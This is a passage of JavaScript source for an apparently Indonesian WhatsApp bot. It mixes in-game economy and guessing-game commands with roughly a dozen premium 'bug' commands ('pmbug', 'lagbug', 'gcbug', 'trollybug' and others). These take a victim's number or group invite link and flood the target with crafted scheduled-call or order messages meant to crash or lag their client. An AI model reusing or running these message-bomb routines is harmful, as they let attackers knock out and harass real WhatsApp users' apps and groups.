🐘 Gajah: ${hewan3}` : ''} ${hewan4 ? `
🐐 Kambing: ${hewan4}` : ''} ${hewan5 ? `
🐼 Panda: ${hewan5}` : ''} ${hewan6 ? `
🐊 Buaya: ${hewan6}` : ''} ${hewan7 ? `
🐃 Kerbau: ${hewan7}` : ''} ${hewan8 ? `
🐮 Sapi: ${hewan8}` : ''} ${hewan9 ? `
🐒 Monyet: ${hewan9}` : ''} ${hewan10 ? `
🐗 Babi Hutan: ${hewan10}` : ''} ${hewan11 ? `
🐖 Babi: ${hewan11}` : ''} ${hewan12 ? `
🐓 Ayam: ${hewan12}` : ''}
`.trim()

		user.banteng += hewan1
		user.harimau += hewan2
		user.gajah += hewan3
		user.kambing += hewan4
		user.panda += hewan5
		user.buaya += hewan6
		user.kerbau += hewan7
		user.sapi += hewan8
		user.monyet += hewan9
		user.babihutan += hewan10
		user.babi += hewan11
		user.ayam += hewan12
		
		XeonBotInc.misi[id] = [
        	kerja,
        setTimeout(() => {
            delete XeonBotInc.misi[id]
        }, 20000)
    	]
    
		setTimeout(() => {
			replygcxeon(`${hsl}`)
		}, 20000)

		setTimeout(() => {
			replygcxeon(`Nah ini dia`)
		}, 18000)

		setTimeout(() => {
			replygcxeon('Dorr🔥')
		}, 15000)

		setTimeout(() => {
			replygcxeon('Dapat Sasaran')
		}, 14000)

		setTimeout(() => {
			replygcxeon('Sedang mencari mangsa...')
		}, 0)
		user.lastmisi = new Date * 1
	} else replygcxeon(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break

//=========================================\\
case 'polisi': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = XeonBotInc.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Polisi'
    XeonBotInc.misi = XeonBotInc.misi ? XeonBotInc.misi: {}
    if (id in XeonBotInc.misi) {
        replygcxeon(`Selesaikan Misi ${XeonBotInc.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku1 = Math.floor(Math.random() * 10)
        let randomaku2 = Math.floor(Math.random() * 10)

        let rbrb1 = (randomaku1 * 100000)
        let rbrb2 = (randomaku2 * 1000)

        var dimas = `
👮Mengejar Pencuri....
`.trim()

        var dimas2 = `
👮Menangkap pencuri....
`.trim()

        var dimas3 = `
🚔Membawa ke kantor polisi\nDan di penjara
`.trim()

        var dimas4 = `
➕ 💹Menerima gaji....
`.trim()

        var hsl = `
*—[ Hasil Polisi ${name} ]—*
➕ 💹 Uang = [ ${rbrb1} ]
➕ ✨ Exp = [ ${rbrb2} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()

        user.money += rbrb1
        user.exp += rbrb2
        user.ojekk += 1

        XeonBotInc.misi[id] = [
            kerja,
            setTimeout(() => {
delete XeonBotInc.misi[id]
            }, 27000)
        ]

        setTimeout(() => {
            replygcxeon(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replygcxeon(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replygcxeon(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
           replygcxeon(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replygcxeon(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replygcxeon('??Sedang Berpatroli.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replygcxeon(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=========================================\\
// let pajak = 0.02
case 'berdagang': {
  if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}

    let dapat = (Math.floor(Math.random() * 5000))
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) return replygcxeon ('Tag salah satu lah, yang kamu ingin berdagang bareng')
    if (typeof db.users[who] == 'undefined') return replygcxeon('Pengguna tidak ada didalam data base')
    let __timers = (new Date - global.db.users[m.sender].lastdagang)
    let _timers = (28800000 - __timers)
    let timers = clockString(_timers)
    let users = global.db.users
    let username = XeonBotInc.getName(who)
    if (new Date - global.db.users[m.sender].lastdagang > 28800000) {
        if (4999 > users[who].money) return replygcxeon ('Target tidak memiliki modal harap masukkan modal 5000')
        if (4999 > users[m.sender].money) return replygcxeon ('kamu tidak memiliki modal harap masukkan modal 5000')
        users[who].money -= dapat * 1
        users[m.sender].money -= dapat * 1
        global.db.users[m.sender].lastdagang = new Date * 1
        replygcxeon(`Mohon tunggu kak..\nKamu dan @${who.replace(/@.+/, '')} sedang berdagang.. ðŸ˜…\n\nKamu dan @${who.replace(/@.+/, '')} meletakkan modal -${dapat} ðŸ˜…`)
        setTimeout(() => {
            replygcxeon(m.chat, `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, m, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 3600000)
        setTimeout(() => {
            replygcxeon(`Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 7200000)
        setTimeout(() => {
            replygcxeon( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 10800000)
        setTimeout(() => {
            replygcxeon( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 14400000)
        setTimeout(() => {
            replygcxeon( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 18000000)
        setTimeout(() => {
            replygcxeon( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 21600000)
        setTimeout(() => {
            replygcxeon( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 25200000)
        setTimeout(() => {
            replygcxeon( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +10000\n${users[m.sender].money += 10000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +100000\n${users[who].money += 100000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 28800000)
    } else replygcxeon(`Anda Sudah Berdagang , tunggu ${timers} lagi..`)

}
break

//=========================================\\
case 'merampok':
  case 'rampok': {
    if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}

function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let dapat = (Math.floor(Math.random() * 100000))
    let users = global.db.users
    let who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    if (!who) return replygcxeon('Tag orang yang mau kamu Rampok!')
    if (typeof global.db.users[who] == 'undefined') return replygcxeon('Pengguna tidak ada didalam database')
    if (users[who].level > users[m.sender].level) return replygcxeon(`Level kamu harus lebih tinggi dari @${who.split('@')[0]} Untuk bisa merampoknya!`, false, { mentions: [who] })
    let __timers = (new Date - global.db.users[m.sender].lastrampok)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers)
    if (new Date - global.db.users[m.sender].lastrampok > 3600000) {
        if (10000 > users[who].money) return replygcxeon('ᴛᴀʀɢᴇᴛ ɢᴀᴀᴅᴀ 💰ᴜᴀɴɢ ʙᴏᴅᴏʜ, ᴋɪꜱᴍɪɴ ᴅɪᴀ')
        users[who].money -= dapat * 1
        users[m.sender].money += dapat * 1
        global.db.users[m.sender].lastrampok = new Date * 1
        replygcxeon( `ʙᴇʀʜᴀꜱɪʟ ᴍᴇʀᴀᴍᴘᴏᴋ ᴍᴏɴᴇʏ ᴛᴀʀɢᴇᴛ ꜱᴇʙᴇꜱᴀʀ 💰${dapat}`)
    } else replygcxeon( `Anda Sudah merampok dan berhasil sembunyi , tunggu ${timers} untuk merampok lagi`)
}
break
//=========================================\\
case 'delsesi': 
  case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return replygcxeon('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file kenangan <3\n\n`
if(filteredArray.length == 0) return replygcxeon(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
replygcxeon(`${teks}`) 
await sleep(2000)
replygcxeon("Menghapus file Kenangan...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
replygcxeon("Berhasil menghapus semua Kenangan di folder session")     
});
}
break
//======================================================================
case 'amountbug': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
//======================================================================
case 'pmbug' :{
 if (!isPrem) return replyprem(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 6285892928715`)
 reply(mess.wait)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
//============================================================
case 'delaybug' : {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
reply(mess.wait)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
//=========================================\\
case 'trollybug': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
reply(mess.wait)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
XeonBotInc.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
//=============================================================
case 'docubug': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
//=============================================================
case 'lagbug' : {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
//=============================================================
case 'gcbug' : {
if (!isPrem) return replyprem(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'delaygcbug' :  {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'laggcbug' :  {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
//=============================================================
case 'bomgcbug' :  {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'unlimitedgcbug' :  {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'trollygcbug' :  {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
XeonBotInc.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'docugcbug' :  {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
//===============================================================
case 'tebakkata': {
if (!m.isGroup) return reply(mess.only.group)
  let timeout = 80000
  let id = m.chat
	if (id in XeonBotInc.tebakkata) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let caption = `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${json.soal}\nWaktu : 60s\nHadiah : 10.000 money`
 XeonBotInc.tebakkata[id] = [
	await replygcxeon(`${caption}`),
	json,
 setTimeout(() => {
 if (XeonBotInc.tebakkata[id]) 
 console.log("Jawaban: " + json.jawaban)
 replygcxeon(`Waktu Habis\nJawaban:  ${json.jawaban}\n\nIngin bermain? Ketik tebakkata`) 
 delete XeonBotInc.tebakkata[id]
 }, 60000)
 ]
}
break
//================================================================
case 'tebakgambar': {
  if (!m.isGroup) return reply(mess.only.group)
let timeout = 80000
let id = m.chat
if (id in XeonBotInc.tebakkata) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
async function tebakgambar() {
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
      img: result.img,
      jawaban: result.jawaban,
      deskripsi: result.deskripsi
    }}
  let tos = await tebakgambar ()
  console.log(tos)
 let caption = `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${tos.deskripsi}\nWaktu : 60s\nHadiah : 10.000 money`
 XeonBotInc.tebakgambar[id] = [
    await XeonBotInc.sendMessage(from, {caption: caption, image: {url: tos.img}}, {quoted: m}),
    tos,
 setTimeout(() => {
	if (XeonBotInc.tebakgambar[id])
 replygcxeon(`Waktu Habis\nJawaban:  ${tos.jawaban}\n\nIngin bermain? Ketik tebakgambar`)
 delete XeonBotInc.tebakgambar[id]
 }, 60000)
	 ]
}
break
//==================================================================
case 'tebaklagu': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await JSON.parse(fs.readFileSync('./lib/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await XeonBotInc.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 XeonBotInc.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'tebakkalimat': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 XeonBotInc.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'tebaklirik':{
  if (!m.isGroup) return reply(mess.only.group)
let users = global.db.users[m.sender]
	let timeout = 80000
	let poin = 10000
	let id = m.chat
	if (id in XeonBotInc.tebaklirik) return replygcxeon('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Bonus: ${poin} XP
	Hadiah: ${poin} Money
	`.trim()
	XeonBotInc.tebaklirik[id] = [
	await replygcxeon(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (XeonBotInc.tebaklirik[id]) 
users.money -= 200
